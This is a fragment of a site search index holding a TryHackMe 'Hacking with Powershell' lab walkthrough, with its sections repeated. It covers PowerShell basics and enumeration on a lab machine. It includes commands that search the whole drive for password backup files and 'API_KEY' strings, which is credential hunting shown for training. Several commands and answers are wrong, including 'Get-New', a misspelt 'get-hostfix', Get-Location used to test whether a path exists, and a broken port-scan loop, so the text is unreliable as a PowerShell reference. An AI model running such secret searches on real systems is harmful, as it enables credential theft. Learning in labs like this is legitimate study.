Empire"},{"location":"tryhackme/room/empire/#tryhackme-empire","text":"","title":"TryHackMe - empire"},{"location":"tryhackme/room/empire/#task-1-introduction","text":"","title":"Task 1: Introduction"},{"location":"tryhackme/room/hacking-with-powershell/","tags":["THM-Intro PowerShell"],"text":"TryHackMe - Hacking with Powershell - Walkthrough \u00b6 Task 1: Objectives \u00b6 Content Before completing this room, you should be aware of some fundamentals. For example, the differences between CMD, PS and some syntax. This room will cover the following: What is Powershell Basic Powershell commands Windows enumeration skills Powershell scripting Answer the questions below Read the above and deploy the machine! No answer needed Task 2: What is Powershell? \u00b6 Content Powershell is the Windows Scripting Language and shell environment built using the .NET framework. This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object-oriented. This also means that running cmdlets allows you to perform actions on the output object (which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun ; for example, the cmdlet to list commands is called Get-Command Common verbs to use include: Get Start Stop Read Write New Out To get the complete list of approved verbs, visit this link. Answer the questions below What is the command to get a new object? Get-New To see the usage of a cmdlet we use the syntax Get-Help + <name of cmdlet> -Examples . For example, we want to see the usage of the Get-Command[^2] command, we use the Get-Help Get-Command -Examples syntax. See picture bellow. This pic describes how to use the Get-Command command syntax Task 3: Basic Powershell Commands \u00b6 Content Now that we've understood how cmdlets work - let's explore how to use them! The main thing to remember here is that Get-Command and Get-Help are your best friends! Using Get-Help \u00b6 Get-Help displays information about a cmdlet. To get help with a particular command, run the following: Get-Help Command-Name You can also understand how exactly to use the command by passing in the -examples flag. This would return output like the following: Running the Get-Help cmdlet to explain a command PS C :\\ Users \\ Administrator > Get-Help Get-Command -Examples NAME Get-Command SYNOPSIS Gets all commands . Example 1 : Get cmdlets , functions , and aliases PS C :\\> Get-Command Using Get-Command \u00b6 Get-Command gets all the cmdlets installed on the current Computer. The great thing about this cmdlet is that it allows for pattern matching like the following Get-Command Verb-* or Get-Command *-Noun Running Get-Command New-* to view all the cmdlets for the verb new displays the following: Using the Get-Command to list all cmdlets installed PS C :\\ Users \\ Administrator > Get-Command New -* CommandType Name Version Source ----------- ---- ------- ------ Alias New-AWSCredentials 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2FlowLogs 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2Hosts 3 . 3 . 563 . 1 AWSPowerShell Alias New-RSTags 3 . 3 . 563 . 1 AWSPowerShell Alias New-SGTapes 3 . 3 . 563 . 1 AWSPowerShell Function New-AutologgerConfig 1 . 0 . 0 . 0 EventTracingManagement Function New-DAEntryPointTableItem 1 . 0 . 0 . 0 DirectAccessClientComponents Function New-DscChecksum 1 . 1 PSDesiredStateConfiguration Function New-EapConfiguration 2 . 0 . 0 . 0 VpnClient Function New-EtwTraceSession 1 . 0 . 0 . 0 EventTracingManagement Function New-FileShare 2 . 0 . 0 . 0 Storage Function New-Fixture 3 . 4 . 0 Pester Function New-Guid 3 . 1 . 0 . 0 Microsoft . PowerShell . Utility - -cropped for brevity -- Object Manipulation \u00b6 In the previous task, we saw how the output of every cmdlet is an object. If we want to manipulate the output, we need to figure out a few things: passing the output to other cmdlets using specific object cmdlets to extract information The Pipeline( | ) is used to pass output from one cmdlet to another. A major difference compared to other shells is that Powershell passes an object to the next cmdlet instead of passing text or string to the command after the pipe. Like every object in object-oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet, and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdlet: Verb-Noun | Get-Member An example of running this to view the members for Get-Command is: Get-Command | Get-Member -MemberType Method Using pipe (|) to pass output from one cmdlet to another PS C :\\ Users \\ Administrator > Get-Command | Get-Member -MemberType Method TypeName : System . Management . Automation . AliasInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () TypeName : System . Management . Automation . FunctionInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () TypeName : System . Management . Automation . CmdletInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () PS C :\\ Users \\ Administrator > From the above flag in the command, you can see that you can also select between methods and properties. Creating Objects From Previous cmdlets \u00b6 One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. Here's an example of listing the directories and just selecting the mode and the name: Listing the directories and filtering via mode and name PS C :\\ Users \\ Administrator > Get-ChildItem | Select-Object -Property Mode , Name Mode Name ---- ---- d-r --- Contacts d-r --- Desktop d-r --- Documents d-r --- Downloads d-r --- Favorites d-r --- Links d-r --- Music d-r --- Pictures d-r --- Saved Games d-r --- Searches d-r --- Videos PS C :\\ Users \\ Administrator > You can also use the following flags to select particular information: first - gets the first x object last - gets the last x object unique - shows the unique objects skip - skips x objects Filtering Objects \u00b6 When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties. The general format for using this cmdlet is Verb-Noun | Where-Object -Property PropertyName -operator Value Verb-Noun | Where-Object {$_.PropertyName -operator Value} The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet . Powershell is quite sensitive, so don't put quotes around the command! Where -operator is a list of the following operators: -Contains : if any item in the property value is an exact match for the specified value -EQ : if the property value is the same as the specified value -GT : if the property value is greater than the specified value For a full list of operators, use this link. Here's an example of checking the stopped processes: Demonstrating the use of operators only to show stopped services PS C :\\ Users \\ Administrator > Get-Service | Where-Object -Property Status -eq Stopped Status Name DisplayName ------ ---- ----------- Stopped AJRouter AllJoyn Router Service Stopped ALG Application Layer Gateway Service Stopped AppIDSvc Application Identity Stopped AppMgmt Application Management Stopped AppReadiness App Readiness Stopped AppVClient Microsoft App-V Client Stopped AppXSvc AppX Deployment Service ( AppXSVC ) Stopped AudioEndpointBu ... Windows Audio Endpoint Builder Stopped Audiosrv Windows Audio Stopped AxInstSV ActiveX Installer ( AxInstSV ) Stopped BITS Background Intelligent Transfer Ser ... Stopped Browser Computer Browser Stopped bthserv Bluetooth Support Service -- cropped for brevity -- Sort-Object \u00b6 When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe-lining the output of a cmdlet to the Sort-Object cmdlet . The format of the command would be: Verb-Noun | Sort-Object Here's an example of sorting the list of directories: Using the Sort-Object cmdlet to sort piped information PS C :\\ Users \\ Administrator > Get-ChildItem | Sort-Object Directory : C :\\ Users \\ Administrator Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r --- 10 / 3 / 2019 5 : 11 PM Contacts d-r --- 10 / 5 / 2019 2 : 38 PM Desktop d-r --- 10 / 3 / 2019 10 : 55 PM Documents d-r --- 10 / 3 / 2019 11 : 51 PM Downloads d-r --- 10 / 3 / 2019 5 : 11 PM Favorites d-r --- 10 / 3 / 2019 5 : 11 PM Links d-r --- 10 / 3 / 2019 5 : 11 PM Music d-r --- 10 / 3 / 2019 5 : 11 PM Pictures d-r --- 10 / 3 / 2019 5 : 11 PM Saved Games d-r --- 10 / 3 / 2019 5 : 11 PM Searches d-r --- 10 / 3 / 2019 5 : 11 PM Videos PS C :\\ Users \\ Administrator > Now that you've understood how Powershell works let's try some commands to apply this knowledge! Answer the questions below What is the location of the file \"interesting-file.txt\" Answer Explain C :\\ Program Files To find the file interesting-file.txt we will scan the directory with the following command: Get-ChildItem -Path D :\\ -Include * interesting -file *. txt -File -Recurse -ErrorAction SilentlyContinue I will explain the flags: Flag -Path: Specify the path to scan Flag -Include: Specify the file to scan (You can use the * operator to specify to find files whose filename includes the string between the two * operators we have set.) Flag -File: Specify only file Flag -Recurse: Recursive search Flag -ErrorAction SilentlyContinue: Ignore error Specify the contents of this file Answer Explain notsointerestingcontent To view content of file, you can use: 1 . Get-Content -Path + path_of_file 2 . More + path_of_file How many cmdlets are installed on the system(only cmdlets, not functions and aliases)? Answer Explain 6638 First of all, you must know all functions and cmdlets on the system by listing them. Use Get-Commnad . You see that the output consists of 4 columns in order: CommandType, Name, Version, Source. Focus at CommandType to filter. Second, filter the results to find the number of cmdlets by: Where-Object -Property CommandType -like Cmdlet . Ye, you have filtered out all cmdlets on the system. Last, let's count them by Measure command The image describes the result Get the MD5 hash of interesting-file.txt Answer Explain 49A586A2A9456226F8A1B4CEC6FAB329 To get hash of file, you can use Get-FileHash + -Algorithm -MD5. The full syntax to solve this question is: Get-FileHash C :\\ 'Program Files' \\ interesting -file . txt . txt -Algorithm -MD5 What is the command to get the current working directory? Answer Explain Get-Location To get the current working directory, you will use Get-Location command. Furthermore, you can use Get-LocalUser command to computer show up all user in computer. Does the path \"C:\\Users\\Administrator\\Documents\\Passwords\" Exist (Y/N)? Answer Explain N Like the previous scenario, we will use Get-Location + path to check if the working directory exists or not. Full syntax: Get-Location C :\\ Users \\ Administrator \\ Documents \\ Passwords The image describes the result What command would you use to make a request to a web server? Answer Explain Invoke-WebRequest Search google or find in all cmdlets on the system by filtering as follows: Find all cmdlets and funtions by Get-Command command Filter to get cmdlets which itself has one and keywords like call, request,... in the name by Where-Object -Property Name -like *request* . You will see Invoke-WebRequest command in results. Base64 decode the file b64.txt on Windows. Answer Explain ihopeyoudidthisonwindows To showup this question, use Certutil command with flag decode. Besides, Certutil command also has some useful flags: encode: encode according to base64 decodehex: decode according to hexadecimal View more at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil Full step: Certutil -decode b64.txt output.txt Get-Content output.txt PS C :\\ Users \\ Administrator \\ Desktop > certutil -decode .\\ b64 . txt a . txt Input Length = 432 Output Length = 323 CertUtil : -decode command completed successfully . PS C :\\ Users \\ Administrator \\ Desktop > Get-Content a . txt this is the flag - ihopeyoudidthisonwindows the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage Task 4: Enumeration \u00b6 Content The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following: users basic networking information file permissions registry permissions scheduled and running tasks insecure files Your task will be to answer the following questions to enumerate the machine using Powershell commands! Answer the questions below How many users are there on the machine? Answer Explain 5 Use Get-LocalUser command which I explained at What is the command to get the current working directory? question Which local user does this SID(S-1-5-21-1394777289-3961777894-1791813945-501) belong to? Answer Explain Guest Use Get-LocalUser | Select * command to showup full property. Then, filter output and get results. PS C :\\ Users \\ Administrator \\ Desktop > get-localuser | select * | where-object sid -like * 501 * AccountExpires : Description : Built-in account for guest access to the computer / domain Enabled : False FullName : PasswordChangeableDate : PasswordExpires : UserMayChangePassword : False PasswordRequired : False PasswordLastSet : LastLogon : Name : Guest SID : S - 1 - 5 - 21 - 1394777289 - 3961777894 - 1791813945 - 501 PrincipalSource : Local ObjectClass : User How many users have their password required values set to False? Answer Explain 4 Filter, filter, filter,... PS C :\\ Users \\ Administrator \\ Desktop > get-localuser | select * | where-object passwordrequired -match false | measure Count : 4 Average : Sum : Maximum : Minimum : Property : How many local groups exist? Answer Explain 24 Use get-command | where name -like *group* | where name -like *local* to file cmdlet, and filter then. PS C :\\ Users \\ Administrator \\ Desktop > get-command | where-object name -like * group * | where-object name -like * local * CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Add-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet New-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Rename-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Set-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts PS C :\\ Users \\ Administrator \\ Desktop > get-command | where name -like * group * | where name -like * local * CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Add-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet New-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Rename-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Set-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts PS C :\\ Users \\ Administrator \\ Desktop > get-localgroup Name Description ---- ----------- Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission ... Administrators Administrators have complete and unrestricted access to the computer / domain Backup Operators Backup Operators can override security restrictions for the sole purpose of back ... Certificate Service DCOM Access Members of this group are allowed to connect to Certification Authorities in the ... Cryptographic Operators Members are authorized to perform cryptographic operations . Distributed COM Users Members are allowed to launch , activate and use Distributed COM objects on this ... Event Log Readers Members of this group can read event logs from local machine Guests Guests have the same access as members of the Users group by default , except for ... Hyper-V Administrators Members of this group have complete and unrestricted access to all features of H ... IIS_IUSRS Built-in group used by Internet Information Services . Network Configuration Operators Members in this group can have some administrative privileges to manage configur ... Performance Log Users Members of this group may schedule logging of performance counters , enable trace ... Performance Monitor Users Members of this group can access performance counter data locally and remotely Power Users Power Users are included for backwards compatibility and possess limited adminis ... Print Operators Members can administer printers installed on domain controllers RDS Endpoint Servers Servers in this group run virtual machines and host sessions where users RemoteA ... RDS Management Servers Servers in this group can perform routine administrative actions on servers runn ... RDS Remote Access Servers Servers in this group enable users of RemoteApp programs and personal virtual de ... Remote Desktop Users Members in this group are granted the right to logon remotely Remote Management Users Members of this group can access WMI resources over management protocols ( such a ... Replicator Supports file replication in a domain Storage Replica Administrators Members of this group have complete and unrestricted access to all features of S ... System Managed Accounts Group Members of this group are managed by the system . Users Users are prevented from making accidental or intentional system-wide changes an ... PS C :\\ Users \\ Administrator \\ Desktop > get-localgroup | measure Count : 24 Average : Sum : Maximum : Minimum : Property : What command did you use to get the IP address info? Answer Explain Get-NetIPAddress Use Get-Command | Where-Object -property name -like \"*ip*\" | where-object -property Name -like \"*address*\" to find cmdlets. How many ports are listed as listening? Answer Explain 20 Use this command: get-nettcpconnection | where state -match listen | measure What is the remote address of the local port listening on port 445? Answer Explain :: Use this command: get-nettcpconnection | where localport -match 445 How many patches have been applied? Answer Explain 20 Use this command: get-hostfix When was the patch with ID KB4023834 installed? Answer Explain 6 / 15 / 2017 12 : 00 : 00 AM Use this command: get-hostfix | where hostfixID -match KB4023834 Find the contents of a backup file. Answer Explain backpassflag First, you must find backup (in window, it has the extension .bak ). Find it by get-childitem -path C:\\ -include *.bak* -file -recurse -erroraction silentlycontinue Second, read it PS C :\\ Users \\ Administrator > more 'C:\\Program Files (x86)\\Internet Explorer\\passwords.bak.txt' backpassflag Search for all files containing API_KEY Answer Explain fakekey123 Use this command to solve: get-childitem -path c :\\* -recurse -erroraction silentlycontinue | select-string -pattern API_KEY What command do you do to list all the running processes? Answer Explain Get-Process Find cmdlet by using get-command command and filter What is the path of the scheduled task called new-sched-task? Answer Explain / Find command that it provides schedule task: get-command | where name -like *schedule* . You will see get-scheduledtask , this is the command to look for. Then, filter output and get result. PS C :\\ Users \\ Administrator > get-scheduledtask | where taskname -like * new * TaskPath TaskName State -------- -------- ----- \\ new-sched -task Ready Who is the owner of the C:\\? Answer Explain NT SERVICE \\ TrustedInstaller To get owner of X (path_of_folder/path_of_file), use Get-Acl command . Full syntax to solve: PS C :\\ Users \\ Administrator \\ Desktop > get-acl C :\\ Directory : Path Owner Access ---- ----- ------ C :\\ NT SERVICE \\ TrustedInstaller CREATOR OWNER Allow 268435456 ... Task 5: Basic Scripting Challenge \u00b6 Now that we have run Powershell commands, let's try to write and run a script to do more complex and powerful actions. For this ask, we'll use Powershell ISE (the Powershell Text Editor). Let's use a particular scenario to show an example of this script. Given a list of port numbers, we want to use this list to see if the local port is listening. Open the listening-ports.ps1 script on the Desktop using Powershell ISE. Powershell scripts usually have the .ps1 file extension. $system_ports = Get-NetTCPConnection -State Listen $text_port = Get-Content -Path C :\\ Users \\ Administrator \\ Desktop \\ ports . txt foreach ( $port in $text_port ){ if ( $port -in $system_ports . LocalPort ){ echo $port } } On the first line, we want to get a list of all the ports on the system that are listening. We do this using the Get-NetTCPConnection cmdlet. We are then saving the output of this cmdlet into a variable. The convention to create variables is used as: $variable_name = value In the following line, we want to read a list of ports from the file. We do this using the Get-Content cmdlet. Again, we store this output in the variables. The simplest next step is to iterate through all the ports in the file to see if the ports are listening. To iterate through the ports in the file, we use the following: foreach ( $new_var in $existing_var ){} This particular code block is used to loop through a set of objects. Once we have each individual port, we want to check if this port occurs in the listening local ports. Instead of doing another for loop, we just use an if statement with the -in operator to check if the port exists in the LocalPort property of any object. A full list of if statement comparison operators can be found here. To run the script, call the script path using Powershell or click the green button on Powershell ISE: Now that we've seen what a basic script looks like - it's time to write one of your own. The emails folder on the Desktop contains copies of the emails John, Martha, and Mary have been sending to each other(and themselves). Answer the following questions with regard to these emails (try not to open the files and use a script to answer the questions). Scripting may be a bit difficult, but here is a good resource to use: Answer the questions below What file contains the password Answer Explain Doc3M We use select-string -pattern password command to solve this chall. Let's try it with each file. Full command powershell get-childitem -path .\\emails\\ -file -recurse | select-string -pattern password What is the password? Answer Explain johnisalegend99 What files contains an HTTPS link? Answer Explain Doc2Mary Task 6: Intermediate Scripting \u00b6 Content Now that you've learnt a little bit about how scripting works - let's try something a bit more interesting. Sometimes we may not have utilities like Nmap and Python available, and we are forced to write scripts to do very rudimentary tasks. Why don't you try writing a simple port scanner using Powershell? Here's the general approach to use: Determine IP ranges to scan(in this case it will be localhost) and you can provide the input in any way you want Determine the port ranges to scan Determine the type of scan to run(in this case it will be a simple TCP Connect Scan) Answer the questions below How many open ports did you find between 130 and 140(inclusive of those two)? Answer Explain 11 Use Test-Netconnection command to test connection. Script script.ps1 for ( $i = 130 ; i -le 140 ; $i ++){ test-connection localhost -port $i } More \u00b6 Operator in powershell: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7.3&viewFallbackFrom=powershell-6 Script file: https://learnxinyminutes.com/docs/powershell/ Full command: https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.3&viewFallbackFrom=powershell-7","title":"TryHackMe - Hacking with Powershell - Walkthrough"},{"location":"tryhackme/room/hacking-with-powershell/#tryhackme-hacking-with-powershell-walkthrough","text":"","title":"TryHackMe - Hacking with Powershell - Walkthrough"},{"location":"tryhackme/room/hacking-with-powershell/#task-1-objectives","text":"Content Before completing this room, you should be aware of some fundamentals. For example, the differences between CMD, PS and some syntax. This room will cover the following: What is Powershell Basic Powershell commands Windows enumeration skills Powershell scripting Answer the questions below Read the above and deploy the machine! No answer needed","title":"Task 1:  Objectives"},{"location":"tryhackme/room/hacking-with-powershell/#task-2-what-is-powershell","text":"Content Powershell is the Windows Scripting Language and shell environment built using the .NET framework. This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object-oriented. This also means that running cmdlets allows you to perform actions on the output object (which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun ; for example, the cmdlet to list commands is called Get-Command Common verbs to use include: Get Start Stop Read Write New Out To get the complete list of approved verbs, visit this link. Answer the questions below What is the command to get a new object? Get-New To see the usage of a cmdlet we use the syntax Get-Help + <name of cmdlet> -Examples . For example, we want to see the usage of the Get-Command[^2] command, we use the Get-Help Get-Command -Examples syntax. See picture bellow. This pic describes how to use the Get-Command command syntax","title":"Task 2: What is Powershell?"},{"location":"tryhackme/room/hacking-with-powershell/#task-3-basic-powershell-commands","text":"Content Now that we've understood how cmdlets work - let's explore how to use them! The main thing to remember here is that Get-Command and Get-Help are your best friends!","title":"Task 3: Basic Powershell Commands"},{"location":"tryhackme/room/hacking-with-powershell/#using-get-help","text":"Get-Help displays information about a cmdlet. To get help with a particular command, run the following: Get-Help Command-Name You can also understand how exactly to use the command by passing in the -examples flag. This would return output like the following: Running the Get-Help cmdlet to explain a command PS C :\\ Users \\ Administrator > Get-Help Get-Command -Examples NAME Get-Command SYNOPSIS Gets all commands . Example 1 : Get cmdlets , functions , and aliases PS C :\\> Get-Command","title":"Using Get-Help"},{"location":"tryhackme/room/hacking-with-powershell/#using-get-command","text":"Get-Command gets all the cmdlets installed on the current Computer. The great thing about this cmdlet is that it allows for pattern matching like the following Get-Command Verb-* or Get-Command *-Noun Running Get-Command New-* to view all the cmdlets for the verb new displays the following: Using the Get-Command to list all cmdlets installed PS C :\\ Users \\ Administrator > Get-Command New -* CommandType Name Version Source ----------- ---- ------- ------ Alias New-AWSCredentials 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2FlowLogs 3 . 3 . 563 . 1 AWSPowerShell Alias New-EC2Hosts 3 . 3 . 563 . 1 AWSPowerShell Alias New-RSTags 3 . 3 . 563 . 1 AWSPowerShell Alias New-SGTapes 3 . 3 . 563 . 1 AWSPowerShell Function New-AutologgerConfig 1 . 0 . 0 . 0 EventTracingManagement Function New-DAEntryPointTableItem 1 . 0 . 0 . 0 DirectAccessClientComponents Function New-DscChecksum 1 . 1 PSDesiredStateConfiguration Function New-EapConfiguration 2 . 0 . 0 . 0 VpnClient Function New-EtwTraceSession 1 . 0 . 0 . 0 EventTracingManagement Function New-FileShare 2 . 0 . 0 . 0 Storage Function New-Fixture 3 . 4 . 0 Pester Function New-Guid 3 . 1 . 0 . 0 Microsoft . PowerShell . Utility - -cropped for brevity --","title":"Using Get-Command"},{"location":"tryhackme/room/hacking-with-powershell/#object-manipulation","text":"In the previous task, we saw how the output of every cmdlet is an object. If we want to manipulate the output, we need to figure out a few things: passing the output to other cmdlets using specific object cmdlets to extract information The Pipeline( | ) is used to pass output from one cmdlet to another. A major difference compared to other shells is that Powershell passes an object to the next cmdlet instead of passing text or string to the command after the pipe. Like every object in object-oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet, and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdlet: Verb-Noun | Get-Member An example of running this to view the members for Get-Command is: Get-Command | Get-Member -MemberType Method Using pipe (|) to pass output from one cmdlet to another PS C :\\ Users \\ Administrator > Get-Command | Get-Member -MemberType Method TypeName : System . Management . Automation . AliasInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () TypeName : System . Management . Automation . FunctionInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () TypeName : System . Management . Automation . CmdletInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals ( System . Object obj ) GetHashCode Method int GetHashCode () GetType Method type GetType () ResolveParameter Method System . Management . Automation . ParameterMetadata ResolveParameter ( string name ) ToString Method string ToString () PS C :\\ Users \\ Administrator > From the above flag in the command, you can see that you can also select between methods and properties.","title":"Object Manipulation"},{"location":"tryhackme/room/hacking-with-powershell/#creating-objects-from-previous-cmdlets","text":"One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. Here's an example of listing the directories and just selecting the mode and the name: Listing the directories and filtering via mode and name PS C :\\ Users \\ Administrator > Get-ChildItem | Select-Object -Property Mode , Name Mode Name ---- ---- d-r --- Contacts d-r --- Desktop d-r --- Documents d-r --- Downloads d-r --- Favorites d-r --- Links d-r --- Music d-r --- Pictures d-r --- Saved Games d-r --- Searches d-r --- Videos PS C :\\ Users \\ Administrator > You can also use the following flags to select particular information: first - gets the first x object last - gets the last x object unique - shows the unique objects skip - skips x objects","title":"Creating Objects From Previous cmdlets"},{"location":"tryhackme/room/hacking-with-powershell/#filtering-objects","text":"When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties. The general format for using this cmdlet is Verb-Noun | Where-Object -Property PropertyName -operator Value Verb-Noun | Where-Object {$_.PropertyName -operator Value} The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet . Powershell is quite sensitive, so don't put quotes around the command! Where -operator is a list of the following operators: -Contains : if any item in the property value is an exact match for the specified value -EQ : if the property value is the same as the specified value -GT : if the property value is greater than the specified value For a full list of operators, use this link. Here's an example of checking the stopped processes: Demonstrating the use of operators only to show stopped services PS C :\\ Users \\ Administrator > Get-Service | Where-Object -Property Status -eq Stopped Status Name DisplayName ------ ---- ----------- Stopped AJRouter AllJoyn Router Service Stopped ALG Application Layer Gateway Service Stopped AppIDSvc Application Identity Stopped AppMgmt Application Management Stopped AppReadiness App Readiness Stopped AppVClient Microsoft App-V Client Stopped AppXSvc AppX Deployment Service ( AppXSVC ) Stopped AudioEndpointBu ... Windows Audio Endpoint Builder Stopped Audiosrv Windows Audio Stopped AxInstSV ActiveX Installer ( AxInstSV ) Stopped BITS Background Intelligent Transfer Ser ... Stopped Browser Computer Browser Stopped bthserv Bluetooth Support Service -- cropped for brevity --","title":"Filtering Objects"},{"location":"tryhackme/room/hacking-with-powershell/#sort-object","text":"When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe-lining the output of a cmdlet to the Sort-Object cmdlet . The format of the command would be: Verb-Noun | Sort-Object Here's an example of sorting the list of directories: Using the Sort-Object cmdlet to sort piped information PS C :\\ Users \\ Administrator > Get-ChildItem | Sort-Object Directory : C :\\ Users \\ Administrator Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r --- 10 / 3 / 2019 5 : 11 PM Contacts d-r --- 10 / 5 / 2019 2 : 38 PM Desktop d-r --- 10 / 3 / 2019 10 : 55 PM Documents d-r --- 10 / 3 / 2019 11 : 51 PM Downloads d-r --- 10 / 3 / 2019 5 : 11 PM Favorites d-r --- 10 / 3 / 2019 5 : 11 PM Links d-r --- 10 / 3 / 2019 5 : 11 PM Music d-r --- 10 / 3 / 2019 5 : 11 PM Pictures d-r --- 10 / 3 / 2019 5 : 11 PM Saved Games d-r --- 10 / 3 / 2019 5 : 11 PM Searches d-r --- 10 / 3 / 2019 5 : 11 PM Videos PS C :\\ Users \\ Administrator > Now that you've understood how Powershell works let's try some commands to apply this knowledge! Answer the questions below What is the location of the file \"interesting-file.txt\" Answer Explain C :\\ Program Files To find the file interesting-file.txt we will scan the directory with the following command: Get-ChildItem -Path D :\\ -Include * interesting -file *. txt -File -Recurse -ErrorAction SilentlyContinue I will explain the flags: Flag -Path: Specify the path to scan Flag -Include: Specify the file to scan (You can use the * operator to specify to find files whose filename includes the string between the two * operators we have set.) Flag -File: Specify only file Flag -Recurse: Recursive search Flag -ErrorAction SilentlyContinue: Ignore error Specify the contents of this file Answer Explain notsointerestingcontent To view content of file, you can use: 1 . Get-Content -Path + path_of_file 2 . More + path_of_file How many cmdlets are installed on the system(only cmdlets, not functions and aliases)? Answer Explain 6638 First of all, you must know all functions and cmdlets on the system by listing them. Use Get-Commnad . You see that the output consists of 4 columns in order: CommandType, Name, Version, Source. Focus at CommandType to filter. Second, filter the results to find the number of cmdlets by: Where-Object -Property CommandType -like Cmdlet . Ye, you have filtered out all cmdlets on the system. Last, let's count them by Measure command The image describes the result Get the MD5 hash of interesting-file.txt Answer Explain 49A586A2A9456226F8A1B4CEC6FAB329 To get hash of file, you can use Get-FileHash + -Algorithm -MD5. The full syntax to solve this question is: Get-FileHash C :\\ 'Program Files' \\ interesting -file . txt . txt -Algorithm -MD5 What is the command to get the current working directory? Answer Explain Get-Location To get the current working directory, you will use Get-Location command. Furthermore, you can use Get-LocalUser command to computer show up all user in computer. Does the path \"C:\\Users\\Administrator\\Documents\\Passwords\" Exist (Y/N)? Answer Explain N Like the previous scenario, we will use Get-Location + path to check if the working directory exists or not. Full syntax: Get-Location C :\\ Users \\ Administrator \\ Documents \\ Passwords The image describes the result What command would you use to make a request to a web server? Answer Explain Invoke-WebRequest Search google or find in all cmdlets on the system by filtering as follows: Find all cmdlets and funtions by Get-Command command Filter to get cmdlets which itself has one and keywords like call, request,... in the name by Where-Object -Property Name -like *request* . You will see Invoke-WebRequest command in results. Base64 decode the file b64.txt on Windows. Answer Explain ihopeyoudidthisonwindows To showup this question, use Certutil command with flag decode. Besides, Certutil command also has some useful flags: encode: encode according to base64 decodehex: decode according to hexadecimal View more at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil Full step: Certutil -decode b64.txt output.txt Get-Content output.txt PS C :\\ Users \\ 